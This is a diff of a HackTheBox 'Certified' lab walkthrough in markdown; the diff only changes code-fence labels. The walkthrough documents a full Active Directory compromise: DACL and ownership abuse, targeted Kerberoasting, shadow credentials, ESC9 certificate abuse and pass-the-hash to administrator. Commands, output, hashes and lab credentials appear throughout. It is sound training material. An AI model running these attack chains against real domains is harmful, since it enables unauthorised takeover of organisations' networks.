@@ -5,7 +5,7 @@ As is common in Windows pentests, you will start the Certified box with credenti
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+```
 nmap -sV -sC -vv 10.10.11.41
 nmap -sU --top-ports=10 -vv 10.10.11.41
 
@@ -158,7 +158,7 @@ PORT     STATE         SERVICE      REASON
 		- Add above 2 to /etc/hosts
 ## SMB Enumeration
 - Passing these commands we end up finding a share:
-```bash
+```
 smbclient -U 'judith.mader' --password='judith09' -L //10.10.11.41
 --OR--
 netexec smb 10.10.11.41 -u judith.mader -p 'judith09' --shares
@@ -190,11 +190,11 @@ SMB         10.10.11.41     445    DC01             SYSVOL          READ        
 	- only default shares
 ## BloodHound
 - We grab the bloodhound files we need to analyze the target network:
-```bash
+```
 bloodhound-python --dns-tcp -ns 10.10.11.41 -d certified.htb -u 'judith.mader' -p 'judith09' -c all
 ```
 - We start up bloodhound and add the files:
-```bash
+```
 --TERMINAL-1--
 sudo neo4j console # login if needed or first entry at localhost:7474
 ---TERMINAL-2--
@@ -204,7 +204,7 @@ sudo bloodhound --disable-gpu # argument due to issues in running bloodhound on 
 - We search for our compromised user judith.mader and mark as owned (also visible in the above search)
 	- We check First Degree Object Control under OUTBOUND OBJECT CONTROL and see we have WriteOwner privilege i.e e can modify the owner of the management group.
 		- We first change the ownership of the object. (Had to change -owner to -new-owner as comapared to the bloodhound command)
-```bash
+```
 impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
 
 ---OUTPUT---
@@ -216,7 +216,7 @@ impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 
 [*] OwnerSid modified successfully!
 ```
 		- Then we give ourselves privileges ( we can use FullControl instead here also but we just need Write privileges as shown in bloodhound). I had to make some small changes to the code provided
-```bash
+```
 impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
 
 ---OUTPUT---
@@ -225,7 +225,7 @@ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.made
 [*] DACL modified successfully!
 ```
 		- Next we add our user as a member to this group and verify it
-			```bash
+			```
 # To add member
 ```
 net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb" 
@@ -243,18 +243,18 @@ CERTIFIED\management_svc
 	- We see we have generic write access to our high value target Management_SVC 
 		- Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
 		- We perform Targetted Kerberoast attack on our target ( we get an error initially)
-```bash
+```
 sudo python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
 
 ---OUTPUT-ERROR---
 impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 			- We fix this by syncing our clock to target.
-```bash
+```
 sudo ntpdate 10.10.11.41
 ```
 			- We pass the attack again :
-```bash
+```
 sudo python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
 
 ---OUTPUT---
@@ -262,7 +262,7 @@ $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$83a4026c
 ```
 		- We try to crack it with john but it fails
 	- We also see we can do a shadow credential attack on management_svc and attempt that instead:
-```bash
+```
 sudo python3 /opt/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 
 ---OUTPUT---
@@ -283,7 +283,7 @@ sudo python3 /opt/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith
 ```
 		- We then use PKINITtools to first generate a TGT ticket (format for commands listed in github. can use use --help in command):
 			- https://github.com/dirkjanm/PKINITtools
-```bash
+```
 2025-04-16 13:09:18,130 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
 zsh: segmentation fault  sudo python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx  -pfx-pas
@@ -294,7 +294,7 @@ INFO:minikerberos:Loading certificate and key from file
 zsh: segmentation fault  sudo python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx  -pfx-pas
 ```
 			- on searching google I come accross an issue int heir github about this very issue which could be solved currently by passing these commands and then executing the file:
-```bash
+```
 sudo su
 virtualenv venv
 source venv/bin/activate
@@ -319,7 +319,7 @@ INFO:minikerberos:Saved TGT to file
 ```
 				- Remember to deactivate virtual environment after completing with the `deactivate` command
 			- Now using PKINITtools we attempt to grab the NTHash from this TGT:
-```bash
+```
 export KRB5CCNAME=management_svc.ccache
 python3 getnthash.py certified.htb/management_svc -key 2d0c83a142d01c31acda00384ea7147bc93fdf4ab76315dc938061ca2d9ac8af
 
@@ -333,7 +333,7 @@ a091c1832bcdd4677c28b5a6a1295
 ```
 				- We get hash
 - We pass these commands to check if credentials work:
-```bash
+```
 netexec smb 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
 netexec winrm 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
 
@@ -348,7 +348,7 @@ WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019
 WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
 ```
 	- We can winrm into the machine :
-```bash
+```
 evil-winrm -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' -i  10.10.11.41
 ```
 		- We geruser flag
@@ -359,7 +359,7 @@ evil-winrm -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' -i  10.10.1
 		- I tried TargetedKerberoast again but once again the hash failed to crack so I proceeded with Shadow Credential Attack
 		- Another way to do this is with certipy
 			- This makes the process much more easier as it does the whole process in one command and doens't have the minikerberos issue GETPKINITtools is currently having
-```bash
+```
 certipy shadow auto -target certified.htb -dc-ip 10.10.11.41 -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator    #-hashes or -password if doing it for judith.mader
 
 ---OUTPUT---
@@ -385,12 +385,12 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 			- We get hash for ca_operator.
 ## Privilege Escalation
 - (From walkthrough): We can also check the services running and we will find ADCS hinting at checking for certificate vulnerabilities:
-```bash
+```
 nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M
 adcs
 ```
 - On enumerating we also check for vulnerable certificates (done on each user but this is where it is relevant)
-```bash
+```
 certipy find -u 'ca_operator' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -target 10.10.11.41 -stdout -vulnerable
 
 ---OUTPUT---
@@ -475,7 +475,7 @@ Certificate Templates
 	- We see ca_operator user is vulnerable to ESC9
 		- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension
 - Then, the `userPrincipalName` of `ca_operator` is changed to `administrator`.
-```bash
+```
 certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn administrator
 
 ---OUTPUT---
@@ -484,7 +484,7 @@ certipy account update -username "management_svc@certified.htb" -hashes "a091c18
 [*] Successfully updated 'ca_operator'
 ```
 - The vulnerable certificate can now be requested as `ca_operator`.
-```bash
+```
 certipy req -username "ca_operator@certified.htb" -hashes "b4b86f45c6018f1b664f70805f45d8f2" -target "certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' # information for this obtained via the find command earlier
 
 ---OUTPUT---
@@ -498,7 +498,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 - Now we change back `ca_operator`'s principal name to it's original:
-```bash
+```
 certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn ca_operator@certified.htb
 
 ---OUTPUT---
@@ -509,7 +509,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_operator'
 ```
 - Now, authenticating with the obtained certificate will provide the `ca_operator`'s NT hash 
-```bash
+```
 certipy auth -pfx administrator.pfx -domain 'certified.htb'
 
 ---OUTPUT---
@@ -522,7 +522,7 @@ certipy auth -pfx administrator.pfx -domain 'certified.htb'
 ```
 	- We obtain Administrator's hash
 - We can now use Pass-the_hash to login as Administrator (either via winrm or psexec):
-```bash
+```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 administrator@10.10.11.41
 
 --OR--
@@ -566,7 +566,7 @@ certified\administrator
 	- they are broken for bloodhound so we can't use it
 	- instead we can download via `-json` to pass jqueries.
 - To find vulnerable target:
-```bash
+```
 vi filter.sh
 chmod +x filter.sh
 cat filter.sh
@@ -657,7 +657,7 @@ cat 20250416152419_Certipy.json | jq '."Certificate Templates" | to_entries[] | 
 				- It won't work as Administrator (shows a mismatch between user 'administrator' error)
 					- But will work if you set upn as literally anything else
 					- can check the certificate file:
-```bash
+```
 openssl pkcs12 -in adminsitrator.pfx -clcerts -nokeys -out adminsitrator.pem
 <no pwd>
 openssl x509 -in administrator.pem -text -noout
@@ -674,7 +674,7 @@ openssl x509 -in administrator.pem -text -noout
 - Things can get hidden if we just do shortest paths so queries can be very useful in complex networks.
 - Talks about using queries with bloodhound (difrent platform than mine i think..cant find these options)
 	- but the queries work so I added them to check:
-```bash
+```
 
 #Match all usrs who have PSRemote permission to computer
 $|MATCH p=(m:User)-[:CanPSRemote]->[:Computer]
